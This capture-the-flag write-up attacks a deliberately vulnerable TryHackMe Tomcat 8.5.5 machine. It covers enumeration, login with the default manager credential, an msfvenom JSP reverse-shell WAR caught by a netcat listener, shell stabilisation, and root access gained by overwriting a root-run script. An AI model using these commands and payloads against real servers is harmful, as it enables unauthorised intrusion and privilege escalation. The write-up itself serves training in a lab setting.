# THM - Thompson

## IP Address
10.10.118.71

## Write Up
1. do an Nmap scan.
```bash
#make a directory to store where you are going to store you nmap results
mkdir nmap
#scan for open ports and direct results to nmap/initial
nmap -p- -sV -sC -oN nmap/initial 10.10.118.71
```

- Results:
```
Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-27 14:19 UTC
Nmap scan report for ip-10-10-118-71.eu-west-1.compute.internal (10.10.118.71)
Host is up (0.00076s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 fc:05:24:81:98:7e:b8:db:05:92:a6:e7:8e:b0:21:11 (RSA)
|   256 60:c8:40:ab:b0:09:84:3d:46:64:61:13:fa:bc:1f:be (ECDSA)
|_  256 b5:52:7e:9c:01:9b:98:0c:73:59:20:35:ee:23:f1:a5 (ED25519)
8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
|_ajp-methods: Failed to get a valid response for the OPTION request
8080/tcp open  http    Apache Tomcat 8.5.5
|_http-favicon: Apache Tomcat
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Apache Tomcat/8.5.5
MAC Address: 02:E5:D9:85:4E:C4 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.99 seconds
```

2. Tomcat version is ```8.5.5``` and we know that the CTF image is an image of Tomcat. so lets try to see if there are any vunerability on ```8.5.5```:
```bash
searchsploit tomcat
```
- Results show nothing useful.

- Tried gobusters nothing useful came out except a few additional pages:
```
root@kali:~# gobuster dir -u http://10.10.118.71:8080 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.118.71:8080
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/04/27 14:33:53 Starting gobuster
===============================================================
/docs (Status: 302)
/examples (Status: 302)
/manager (Status: 302)
==================================
```

- Try nikto to see if anything useful came out:
```bash
nikto -h 10.10.118.71:8080
```
- Results show something useful finally. A default login:
```
root@kali:~# nikto -h 10.10.118.71:8080
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.118.71
+ Target Hostname:    10.10.118.71
+ Target Port:        8080
+ Start Time:         2020-04-27 14:39:25 (GMT0)
---------------------------------------------------------------------------
+ Server: No banner retrieved
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ OSVDB-39272: /favicon.ico file identifies this app/server as: Apache Tomcat (possibly 5.5.26 through 8.0.15), Alfresco Community
+ Allowed HTTP Methods: GET, HEAD, POST, PUT, DELETE, OPTIONS 
+ OSVDB-397: HTTP method ('Allow' Header): 'PUT' method could allow clients to save files on the web server.
+ OSVDB-5646: HTTP method ('Allow' Header): 'DELETE' may allow clients to remove files on the web server.
+ /examples/servlets/index.html: Apache Tomcat default JSP pages present.
+ OSVDB-3720: /examples/jsp/snp/snoop.jsp: Displays information about page retrievals, including other users.
+ Default account found for 'Tomcat Manager Application' at /manager/html (ID 'tomcat', PW 's3cret'). Apache Tomcat.
+ /manager/html: Tomcat Manager / Host Manager interface found (pass protected)
+ /host-manager/html: Tomcat Manager / Host Manager interface found (pass protected)
+ /manager/status: Tomcat Server Status interface found (pass protected)
+ 7993 requests: 0 error(s) and 13 item(s) reported on remote host
+ End Time:           2020-04-27 14:39:39 (GMT0) (14 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

4. After logging in, we will see a very weird hashed(?) web url ```/hgkFDt6wiHIUB29WWEON5PA```. Let see what we can find in there.
- Seems like its only a blank page.

5. Below there is an option that allows me to upload .war file. I am not very familiar with .war so lets see if I can upload a .php reverse shell instead.
```
FAIL - File uploaded "lame.php" must be a .war
```

- Ok so... .war then:
```bash
#make script
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.117.239 LPORT=9001 -f war > reverse.war

#make listener on another terminal
nc -lvnp 9001
```

- remember to click on the reverse shell in tomcat and:
```
root@kali:~# nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.10.117.239] from (UNKNOWN) [10.10.118.71] 42772

```

6. Time to make the shell stable:

- type the following:
```bash
python -c "import pty; pty.spawn('/bin/bash')"
```

- press ```ctrl+z``` to bring shell to foreground

- type:
```bash
stty raw -echo
fg
```

- press ```Enter``` a few times to get back the shell

- type:
```bash
export TERM=xterm
```

- press ```crtl+l``` to get a clean and stable shell.

7. after checking ```ls /home``` we found out that the username is ```jack``` and we can capture the flag thru:
```bash
cat /home/jack/user.txt
```

## Previlege Escalation

8. So at ls we see a few other files like ```id.sh``` and ```test.txt``` let see what are they:
- test.txt:
```
tomcat@ubuntu:/$ cat /home/jack/test.txt
uid=0(root) gid=0(root) groups=0(root)
```

- id.sh:
```
tomcat@ubuntu:/$ cat /home/jack/id.sh
#!/bin/bash
id > test.txt
```

- Seems to be some sort of script giving root access to the current user. Lets try running it:
```bash
tomcat@ubuntu:/$ chmod +x /home/jack/id.sh
chmod: changing permissions of '/home/jack/id.sh': Operation not permitted
tomcat@ubuntu:/$ /home/jack/id.sh
/home/jack/id.sh: line 2: test.txt: Permission denied
tomcat@ubuntu:/$ 
```
-Sigh permission denied.

9. Let see if we can find any SUID to abuse:
```bash
find / -perm -4000  2>/dev/null
```

- Results, not useful:
```
tomcat@ubuntu:/$ find / -perm -4000  2>/dev/null
/bin/su
/bin/ping6
/bin/ping
/bin/mount
/bin/fusermount
/bin/umount
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/newgrp
/usr/bin/sudo
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/vmware-user-suid-wrapper
/usr/bin/passwd
```

10. Lets move back to ```id.sh``` let see if we can echo a command to read the root flag:
```
tomcat@ubuntu:/$ cd /home/jack
tomcat@ubuntu:/home/jack$ ls
id.sh  test.txt  user.txt
tomcat@ubuntu:/home/jack$ echo "cat /root/root.txt > test.txt" > id.sh
tomcat@ubuntu:/home/jack$ bash id.sh
id.sh: line 1: test.txt: Permission denied
tomcat@ubuntu:/home/jack$ cat test.txt
xxxxxxxxxxxxxxxxxxxxxxxxxx
```

